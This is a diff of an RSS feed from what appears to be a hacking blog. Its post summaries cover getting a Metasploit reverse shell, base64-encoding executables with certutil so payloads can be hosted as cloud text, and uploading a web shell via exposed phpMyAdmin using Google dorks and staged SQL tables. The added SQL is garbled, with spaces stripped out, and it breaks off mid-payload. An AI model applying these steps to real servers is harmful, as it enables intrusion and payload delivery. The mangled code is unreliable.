@@ -87,10 +87,11 @@ Get Reverse Shell Go back to metasploit and get the shell.</description>
         <author>thiklab@gmail.com (Thik)</author>
         <atom:modified>Sat, 24 Apr 2021 10:01:06 +0700</atom:modified>
         <guid>https://thiklab.com/posts/convert-exe-to-txt/</guid>
-        <description>So the idea of doing this, is to store any executable files or payloads as a text format on the cloud and everyone can download it without any restricted access.
+        <description>The idea is to store an exe file as a text format and download from the cloud.
 How to convert an .exe file to .txt In windows 7/8/10 open CMD and type.
 1  cmd&amp;gt; certutil -encode file.exe file.txt   This will encrypt the file as base64 into a text format.
-After encrypted the file will look like this.</description>
+After encrypted the file will look like this.
+1 2 3 4 5 6 7 8  -----BEGIN CERTIFICATE----- TVp4AAEAAAAEAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA m21gKiFxNcsclCLVL6Q01cECa/UD1Am02MYPaESJirs/s/5l1TKlKGnQQLTZymuI 1ZJiqgSCbkCdi1scpPQEk+IVPuYnVa91h1qWPA4PO/G2K4M7lQqRrGdQ57i3A+yM v+8J1Zx3eaAnAxpg0FDfzyrUVS4Wc45KE9FVEJTyk706+qFXhvey4pGUSFkH1obG g3mE2SaLGbMQPkC95pNe/vfqyQ4MFgulk1HcL9XA3AyprIVj2H0ve91ip0aeIcOC rzno9vOnK3OrUKUVl9CK2s56VsHUAjmreyKs6cyUxfWUDI6is3NxuSR8AAAAAAAA -----END CERTIFICATE-----   To decode the file just type.</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://thiklab.comimages/feature/article-one.png" medium="image"><media:title type="html">featured image</media:title></media:content>
@@ -131,8 +132,9 @@ After encrypted the file will look like this.</description>
         <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
         <guid>https://thiklab.com/posts/upload-shell-via-phpmyadmin/</guid>
         <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query Go to phpMyadmin database and create new database, ex: &amp;ldquo;uploader&amp;rdquo; and than select on SQL tap and paste this code below.
-1 2 3  CREATE TABLE `uploader`.`userform` ( `track1` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ;   And this code.
-1 2 3  CREATE TABLE `uploader`.`user_upload` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ;   Now select on table user_upload and SQL tap and paste this code below.</description>
+1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   And this code.
+1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   Now select on table user_upload and SQL tap and paste this code below.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(&amp;#39;&amp;lt;!</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://thiklab.comimages/feature/article-one.png" medium="image"><media:title type="html">featured image</media:title></media:content>
